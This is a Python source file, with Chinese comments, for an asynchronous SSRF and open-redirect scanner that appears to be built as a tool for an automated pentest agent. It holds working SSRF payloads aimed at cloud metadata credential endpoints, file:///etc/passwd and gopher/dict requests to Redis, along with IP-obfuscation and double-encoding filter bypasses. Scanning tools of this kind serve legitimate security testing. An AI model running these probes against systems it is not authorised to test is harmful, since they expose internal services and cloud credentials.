"""
ssrf_tool — SSRF（服务端请求伪造）检测

增强点：
1) 参考真实 SSRF 扫描器策略：多类 payload（内网/云元数据/协议/编码/回连）；
2) 异步并发 + 可控速率，避免机械串行扫描；
3) baseline 对比（状态码/长度/延迟）降低误报；
4) 保持与现有 agent 的字段兼容（findings/param/probe/type/url）。
"""
from __future__ import annotations

import asyncio
import ipaddress
import statistics
import time
import urllib.parse
from dataclasses import dataclass
from typing import Any

import httpx

from tools.pure import run_async
from tools.web_utils import normalize_string_list

_UA = "Mozilla/5.0 (PentestPilot/2.0)"
_DEFAULT_TIMEOUT = 12.0
_DEFAULT_MAX_PARAMS = 20
_DEFAULT_MAX_PROBES = 10
_DEFAULT_CONCURRENCY = 20
_DEFAULT_RPS = 25.0

# 常见 SSRF 参数名
_SSRF_PARAMS = [
    "url", "uri", "target", "dest", "destination", "site", "path",
    "callback", "webhook", "hook", "return", "return_url", "redirect", "redirect_url", "next", "goto",
    "endpoint", "api", "proxy", "fetch", "request", "load", "src", "href", "link", "image", "img", "file",
    "continue", "forward", "domain",
]

# 常见开放重定向参数名（也可作为 SSRF 链路）
_REDIRECT_PARAMS = {
    "redirect", "redirect_url", "return", "return_url", "next", "goto", "url", "to", "continue",
}

_REDIRECT_STATUS = {301, 302, 303, 307, 308}

_INTERNAL_LOCATION_TOKENS = (
    "127.0.0.1",
    "localhost",
    "[::1]",
    "0.0.0.0",
    "169.254.169.254",
    "metadata.google.internal",
    "100.100.100.200",
    "10.",
    "172.16.",
    "172.17.",
    "172.18.",
    "172.19.",
    "172.2",
    "172.30.",
    "172.31.",
    "192.168.",
)

# 只作为特征关键字，不作为漏洞直接证据
_CLOUD_META_INDICATORS = [
    "ami-id", "instance-id", "local-ipv4", "iam/security-credentials",
    "computeMetadata", "metadata.google.internal",
    "subscriptionid", "azureenvironment", "metadata/instance",
    "owner-account-id", "100.100.100.200",
]

_INTERNAL_RESPONSE_MARKERS = [
    "root:x:0:0:",
    "etc/passwd",
    "metadata",
    "internal",
    "connection refused",
    "no route to host",
]

_OPEN_REDIRECT_PAYLOADS = [
    "//evil.example",
    "https://evil.example",
    "https://evil.example/%2F..",
]

_BASELINE_URL_VALUE = "https://example.com/"


@dataclass(frozen=True)
class _Probe:
    payload: str
    family: str
    kind: str


class _AsyncRateLimiter:
    def __init__(self, requests_per_second: float):
        self._rps = max(0.0, float(requests_per_second))
        self._interval = (1.0 / self._rps) if self._rps > 0 else 0.0
        self._lock = asyncio.Lock()
        self._next_slot = 0.0

    async def wait(self):
        if self._interval <= 0:
            return
        async with self._lock:
            now = time.monotonic()
            if now < self._next_slot:
                await asyncio.sleep(self._next_slot - now)
                now = time.monotonic()
            self._next_slot = max(now, self._next_slot) + self._interval


def ssrf_scan(
    target: str,
    params: list[str] | str | None = None,
    max_params: int = _DEFAULT_MAX_PARAMS,
    max_probes_per_param: int = _DEFAULT_MAX_PROBES,
    concurrency: int = _DEFAULT_CONCURRENCY,
    requests_per_second: float = _DEFAULT_RPS,
    timeout: float = _DEFAULT_TIMEOUT,
    verify_ssl: bool = False,
    include_open_redirect: bool = True,
    callback_url: str = "",
) -> dict[str, Any]:
    """
    SSRF 检测入口（异步并发）。

    Args:
        target: 目标 URL（可含查询参数）
        params: 额外参数名（列表或逗号分隔字符串）
        max_params: 最大测试参数数量
        max_probes_per_param: 每个参数最多测试 payload 数
        concurrency: 并发请求数
        requests_per_second: 最大请求速率（<=0 表示不限速）
        timeout: 单请求超时（秒）
        verify_ssl: 是否校验证书
        include_open_redirect: 是否附带开放重定向检测
        callback_url: 可选 OAST/回连地址（例如 Burp Collaborator 域名）
    """
    parsed = urllib.parse.urlparse(str(target or "").strip())
    if not parsed.scheme or not parsed.netloc:
        return {
            "target": target,
            "vulnerable": False,
            "findings": [],
            "params_tested": [],
            "error": "目标 URL 非法，需包含 scheme 与 host。",
        }

    existing_params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
    base_url = parsed._replace(query="", fragment="").geturl()

    max_params_value = _to_int(max_params, default=_DEFAULT_MAX_PARAMS, minimum=1, maximum=80)
    probes_per_param_value = _to_int(max_probes_per_param, default=_DEFAULT_MAX_PROBES, minimum=1, maximum=50)
    concurrency_value = _to_int(concurrency, default=_DEFAULT_CONCURRENCY, minimum=1, maximum=200)
    rps_value = _to_float(requests_per_second, default=_DEFAULT_RPS, minimum=0.0, maximum=2000.0)
    timeout_value = _to_float(timeout, default=_DEFAULT_TIMEOUT, minimum=2.0, maximum=90.0)
    verify_ssl_value = _to_bool(verify_ssl, default=False)
    include_open_redirect_value = _to_bool(include_open_redirect, default=True)

    manual_params = normalize_string_list(params)
    param_candidates = _build_param_candidates(existing_params, manual_params, max_params_value)
    probes = _build_probe_list(
        max_probes=probes_per_param_value,
        callback_url=_normalize_callback(callback_url),
    )

    async_result = run_async(
        _scan_async(
            target=target,
            base_url=base_url,
            existing_params=existing_params,
            param_candidates=param_candidates,
            probes=probes,
            concurrency=concurrency_value,
            requests_per_second=rps_value,
            timeout=timeout_value,
            verify_ssl=verify_ssl_value,
            include_open_redirect=include_open_redirect_value,
        )
    )

    findings = _dedupe_findings(async_result.get("findings", []))
    findings.sort(
        key=lambda item: (
            _confidence_weight(str(item.get("confidence", ""))),
            int(item.get("status_code", 0) == 200),
            str(item.get("param", "")),
        ),
        reverse=True,
    )

    return {
        "target": target,
        "vulnerable": len(findings) > 0,
        "findings": findings,
        "params_tested": param_candidates,
        "baseline": async_result.get("baseline", {}),
        "stats": async_result.get("stats", {}),
    }


async def _scan_async(
    target: str,
    base_url: str,
    existing_params: dict[str, str],
    param_candidates: list[str],
    probes: list[_Probe],
    concurrency: int,
    requests_per_second: float,
    timeout: float,
    verify_ssl: bool,
    include_open_redirect: bool,
) -> dict[str, Any]:
    findings: list[dict[str, Any]] = []
    errors = 0
    timeouts = 0
    requests_sent = 0

    limiter = _AsyncRateLimiter(requests_per_second=requests_per_second)
    sem = asyncio.Semaphore(concurrency)
    timeout_once_params: set[str] = set()

    async with httpx.AsyncClient(
        follow_redirects=False,
        timeout=timeout,
        verify=verify_ssl,
        headers={"User-Agent": _UA},
    ) as client:
        baseline = await _collect_baseline(
            client=client,
            target=target,
            base_url=base_url,
            existing_params=existing_params,
            baseline_param=param_candidates[0] if param_candidates else "",
            timeout=timeout,
        )

        tasks = [
            _request_probe(
                client=client,
                limiter=limiter,
                sem=sem,
                base_url=base_url,
                existing_params=existing_params,
                param=param,
                probe=probe,
                timeout=timeout,
            )
            for param in param_candidates
            for probe in probes
        ]

        probe_results = await asyncio.gather(*tasks, return_exceptions=False)
        for item in probe_results:
            requests_sent += 1
            if item.get("error"):
                errors += 1
                continue

            if item.get("timeout"):
                timeouts += 1
                param = str(item.get("param", ""))
                if param and param not in timeout_once_params:
                    timeout_once_params.add(param)
                    findings.append({
                        "type": "ssrf_timeout",
                        "param": param,
                        "probe": str(item.get("probe", "")),
                        "url": str(item.get("url", "")),
                        "status_code": 0,
                        "confidence": "low",
                        "evidence": {
                            "note": "连接超时，目标可能尝试访问不可达内网地址（建议配合 OAST 验证）。",
                            "family": item.get("family", ""),
                            "elapsed_ms": item.get("elapsed_ms", 0),
                        },
                    })
                continue

            analyzed = _analyze_probe_result(item=item, baseline=baseline)
            if analyzed:
                findings.append(analyzed)

        if include_open_redirect:
            findings.extend(
                await _check_open_redirect_async(
                    client=client,
                    limiter=limiter,
                    sem=sem,
                    base_url=base_url,
                    existing_params=existing_params,
                    param_candidates=param_candidates,
                    timeout=timeout,
                )
            )

    return {
        "findings": findings,
        "baseline": {
            "status_codes": sorted(list(baseline.get("status_codes", set()))),
            "avg_length": int(baseline.get("avg_length", 0)),
            "avg_latency_ms": int(baseline.get("avg_latency_ms", 0)),
            "stable": bool(baseline.get("stable", False)),
            "samples": int(baseline.get("samples", 0)),
        },
        "stats": {
            "params": len(param_candidates),
            "probes_per_param": len(probes),
            "requests_planned": len(param_candidates) * len(probes),
            "requests_sent": requests_sent,
            "timeouts": timeouts,
            "errors": errors,
            "concurrency": concurrency,
            "requests_per_second": requests_per_second,
            "open_redirect_checked": include_open_redirect,
        },
    }


async def _collect_baseline(
    client: httpx.AsyncClient,
    target: str,
    base_url: str,
    existing_params: dict[str, str],
    baseline_param: str,
    timeout: float,
) -> dict[str, Any]:
    status_codes: set[int] = set()
    lengths: list[int] = []
    latencies: list[float] = []

    attempts: list[tuple[str, dict[str, str] | None]] = [(target, None)]
    if existing_params:
        attempts.append((base_url, dict(existing_params)))
    if baseline_param:
        benign = dict(existing_params)
        benign[baseline_param] = _BASELINE_URL_VALUE
        attempts.append((base_url, benign))

    for url, params in attempts:
        try:
            start = time.perf_counter()
            resp = await client.get(url, params=params, timeout=timeout)
            elapsed_ms = (time.perf_counter() - start) * 1000.0
        except Exception:
            continue

        status_codes.add(int(resp.status_code))
        lengths.append(len(resp.content or b""))
        latencies.append(elapsed_ms)

    if not lengths:
        return {
            "status_codes": set(),
            "avg_length": 0.0,
            "avg_latency_ms": 0.0,
            "stable": False,
            "samples": 0,
        }

    avg_length = float(statistics.mean(lengths))
    avg_latency_ms = float(statistics.mean(latencies)) if latencies else 0.0
    stable_status = len(status_codes) == 1
    stable_size = (statistics.pstdev(lengths) / avg_length) <= 0.12 if avg_length > 0 else False
    return {
        "status_codes": status_codes,
        "avg_length": avg_length,
        "avg_latency_ms": avg_latency_ms,
        "stable": bool(stable_status and stable_size),
        "samples": len(lengths),
    }


async def _request_probe(
    client: httpx.AsyncClient,
    limiter: _AsyncRateLimiter,
    sem: asyncio.Semaphore,
    base_url: str,
    existing_params: dict[str, str],
    param: str,
    probe: _Probe,
    timeout: float,
) -> dict[str, Any]:
    async with sem:
        await limiter.wait()
        params = dict(existing_params)
        params[param] = probe.payload
        start = time.perf_counter()
        try:
            resp = await client.get(base_url, params=params, timeout=timeout)
            elapsed_ms = (time.perf_counter() - start) * 1000.0
            body = resp.text or ""
            return {
                "param": param,
                "probe": probe.payload,
                "family": probe.family,
                "kind": probe.kind,
                "url": str(resp.url),
                "status_code": int(resp.status_code),
                "headers": dict(resp.headers),
                "body": body,
                "content_length": len(resp.content or b""),
                "elapsed_ms": elapsed_ms,
            }
        except (httpx.ConnectTimeout, httpx.ReadTimeout):
            elapsed_ms = (time.perf_counter() - start) * 1000.0
            parsed = urllib.parse.urlparse(base_url)
            return {
                "param": param,
                "probe": probe.payload,
                "family": probe.family,
                "kind": probe.kind,
                "url": f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                "timeout": True,
                "elapsed_ms": elapsed_ms,
            }
        except Exception as exc:  # pragma: no cover - 网络环境波动
            return {
                "param": param,
                "probe": probe.payload,
                "family": probe.family,
                "kind": probe.kind,
                "error": str(exc),
            }


def _analyze_probe_result(item: dict[str, Any], baseline: dict[str, Any]) -> dict[str, Any] | None:
    body = str(item.get("body", ""))
    body_lower = body.lower()
    headers = item.get("headers", {}) or {}
    location = str(headers.get("location", ""))
    location_lower = location.lower()

    status_code = int(item.get("status_code", 0))
    content_length = int(item.get("content_length", 0))
    elapsed_ms = float(item.get("elapsed_ms", 0.0))

    baseline_status = baseline.get("status_codes", set()) or set()
    avg_length = float(baseline.get("avg_length", 0.0) or 0.0)
    avg_latency = float(baseline.get("avg_latency_ms", 0.0) or 0.0)
    baseline_stable = bool(baseline.get("stable", False))

    cloud_hits = [kw for kw in _CLOUD_META_INDICATORS if kw.lower() in body_lower][:6]
    internal_hits = [kw for kw in _INTERNAL_RESPONSE_MARKERS if kw.lower() in body_lower][:6]
    redirect_hit = status_code in _REDIRECT_STATUS and any(token in location_lower for token in _INTERNAL_LOCATION_TOKENS)

    status_outlier = bool(baseline_status) and status_code not in baseline_status and status_code != 429
    size_diff_ratio = abs(content_length - avg_length) / avg_length if avg_length > 0 else 0.0
    size_outlier = baseline_stable and size_diff_ratio >= 0.35
    latency_outlier = avg_latency > 0 and elapsed_ms >= max(avg_latency * 2.5, 1200.0)

    suspicious = (
        bool(cloud_hits)
        or redirect_hit
        or (bool(internal_hits) and (status_outlier or size_outlier or latency_outlier))
        or (status_outlier and size_outlier and item.get("family") in {"internal", "metadata", "protocol", "callback"})
    )
    if not suspicious:
        return None

    confidence = "low"
    if cloud_hits or redirect_hit:
        confidence = "high"
    elif status_outlier and (size_outlier or latency_outlier):
        confidence = "medium"
    elif internal_hits:
        confidence = "medium"

    finding_type = "ssrf"
    if redirect_hit:
        finding_type = "ssrf_redirect"
    elif item.get("family") == "protocol":
        finding_type = "ssrf_protocol"

    return {
        "type": finding_type,
        "param": str(item.get("param", "")),
        "probe": str(item.get("probe", "")),
        "url": str(item.get("url", "")),
        "status_code": status_code,
        "confidence": confidence,
        "evidence": {
            "family": item.get("family", ""),
            "kind": item.get("kind", ""),
            "cloud_metadata_keywords": cloud_hits,
            "internal_markers": internal_hits,
            "redirect_location": location[:240],
            "status_outlier": status_outlier,
            "size_diff_ratio": round(size_diff_ratio, 4),
            "latency_ms": int(elapsed_ms),
            "response_preview": body[:350],
        },
    }


async def _check_open_redirect_async(
    client: httpx.AsyncClient,
    limiter: _AsyncRateLimiter,
    sem: asyncio.Semaphore,
    base_url: str,
    existing_params: dict[str, str],
    param_candidates: list[str],
    timeout: float,
) -> list[dict[str, Any]]:
    redirect_params = [p for p in param_candidates if p.lower() in _REDIRECT_PARAMS][:8]
    if not redirect_params:
        return []

    async def _request_redirect(param: str, payload: str) -> dict[str, Any]:
        async with sem:
            await limiter.wait()
            params = dict(existing_params)
            params[param] = payload
            try:
                resp = await client.get(base_url, params=params, timeout=timeout)
                return {
                    "ok": True,
                    "param": param,
                    "payload": payload,
                    "status_code": int(resp.status_code),
                    "location": str(resp.headers.get("location", "")),
                    "url": str(resp.url),
                }
            except Exception as exc:
                return {"ok": False, "param": param, "payload": payload, "error": str(exc)}

    tasks = [
        _request_redirect(param, payload)
        for param in redirect_params
        for payload in _OPEN_REDIRECT_PAYLOADS
    ]
    responses = await asyncio.gather(*tasks, return_exceptions=False)

    findings: list[dict[str, Any]] = []
    for item in responses:
        if not item.get("ok"):
            continue
        location = str(item.get("location", ""))
        status_code = int(item.get("status_code", 0))
        if status_code in _REDIRECT_STATUS and "evil.example" in location:
            findings.append({
                "type": "open_redirect",
                "param": str(item.get("param", "")),
                "probe": str(item.get("payload", "")),
                "url": str(item.get("url", "")),
                "status_code": status_code,
                "confidence": "medium",
                "evidence": {
                    "location": location[:240],
                },
            })
    return findings


def _build_param_candidates(
    existing_params: dict[str, str],
    manual_params: list[str],
    max_params: int,
) -> list[str]:
    ordered: list[str] = []
    seen: set[str] = set()
    for name in list(existing_params.keys()) + manual_params + _SSRF_PARAMS:
        key = str(name or "").strip()
        if not key:
            continue
        lowered = key.lower()
        if lowered in seen:
            continue
        seen.add(lowered)
        ordered.append(key)
        if len(ordered) >= max_params:
            break
    return ordered


def _build_probe_list(max_probes: int, callback_url: str) -> list[_Probe]:
    probes: list[_Probe] = []
    seen: set[str] = set()

    def add(payload: str, family: str, kind: str):
        payload_text = str(payload or "").strip()
        if not payload_text or payload_text in seen:
            return
        seen.add(payload_text)
        probes.append(_Probe(payload=payload_text, family=family, kind=kind))

    # 内网 / metadata 核心探针
    seed_http = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/instance/id",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://100.100.100.200/latest/meta-data/",
    ]
    for payload in seed_http:
        family = "metadata" if "metadata" in payload or "100.100.100.200" in payload else "internal"
        add(payload, family=family, kind="plain")

    # IP 变体（参考 SSRF 绕过常见写法）
    for host in _generate_host_variants("127.0.0.1"):
        add(f"http://{host}/", family="internal", kind="ip_variant")
    for host in _generate_host_variants("169.254.169.254"):
        add(f"http://{host}/latest/meta-data/", family="metadata", kind="ip_variant")

    # 协议型 payload
    for payload in [
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_PING",
    ]:
        add(payload, family="protocol", kind="scheme")

    # 编码变体（参考编码绕过）
    enc_source = seed_http[:4]
    for payload in enc_source:
        add(urllib.parse.quote(payload, safe=""), family="encoded", kind="urlencode_once")
        add(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""), family="encoded", kind="urlencode_twice")

    # 可选回连 payload
    if callback_url:
        add(callback_url, family="callback", kind="callback_plain")
        add(f"{callback_url}?from=ssrf_scan", family="callback", kind="callback_query")
        add(urllib.parse.quote(callback_url, safe=""), family="callback", kind="callback_encoded")

    limit = _to_int(max_probes, default=_DEFAULT_MAX_PROBES, minimum=1, maximum=50)
    return probes[:limit]


def _generate_host_variants(host: str) -> list[str]:
    value = str(host or "").strip()
    if not value:
        return []
    variants = [value]

    try:
        ip = ipaddress.ip_address(value)
        if isinstance(ip, ipaddress.IPv4Address):
            as_int = int(ip)
            variants.extend(
                [
                    str(as_int),
                    hex(as_int),
                    f"0{int(str(ip).split('.')[0]):o}.{int(str(ip).split('.')[1]):o}.{int(str(ip).split('.')[2]):o}.{int(str(ip).split('.')[3]):o}",
                    f"{str(ip).split('.')[0]}.{str(ip).split('.')[1]}.{str(ip).split('.')[2]}",
                    f"{str(ip).split('.')[0]}.{str(ip).split('.')[1]}",
                    f"{str(ip).split('.')[0]}.1",
                ]
            )
    except ValueError:
        pass

    deduped: list[str] = []
    seen: set[str] = set()
    for item in variants:
        text = str(item).strip()
        if text and text not in seen:
            seen.add(text)
            deduped.append(text)
    return deduped


def _normalize_callback(callback_url: str) -> str:
    raw = str(callback_url or "").strip()
    if not raw:
        return ""
    parsed = urllib.parse.urlparse(raw)
    if parsed.scheme and parsed.netloc:
        return raw
    if parsed.netloc:
        return f"https://{parsed.netloc}"
    if parsed.path and "." in parsed.path:
        return f"https://{parsed.path}"
    return raw


def _dedupe_findings(findings: list[dict[str, Any]]) -> list[dict[str, Any]]:
    deduped: list[dict[str, Any]] = []
    seen: set[tuple[str, str, str, str]] = set()
    for item in findings:
        key = (
            str(item.get("type", "")),
            str(item.get("param", "")),
            str(item.get("probe", "")),
            str(item.get("url", "")),
        )
        if key in seen:
            continue
        seen.add(key)
        deduped.append(item)
    return deduped


def _confidence_weight(confidence: str) -> int:
    mapping = {"high": 3, "medium": 2, "low": 1}
    return mapping.get(str(confidence or "").strip().lower(), 0)


def _to_int(value: Any, default: int, minimum: int, maximum: int) -> int:
    try:
        if isinstance(value, bool):
            parsed = int(value)
        elif isinstance(value, (int, float)):
            parsed = int(value)
        else:
            parsed = int(str(value).strip())
    except Exception:
        parsed = default
    return max(minimum, min(maximum, parsed))


def _to_float(value: Any, default: float, minimum: float, maximum: float) -> float:
    try:
        if isinstance(value, bool):
            parsed = float(int(value))
        elif isinstance(value, (int, float)):
            parsed = float(value)
        else:
            parsed = float(str(value).strip())
    except Exception:
        parsed = default
    return max(minimum, min(maximum, parsed))


def _to_bool(value: Any, default: bool = False) -> bool:
    if isinstance(value, bool):
        return value
    text = str(value or "").strip().lower()
    if text in {"1", "true", "yes", "y", "on"}:
        return True
    if text in {"0", "false", "no", "n", "off"}:
        return False
    return default
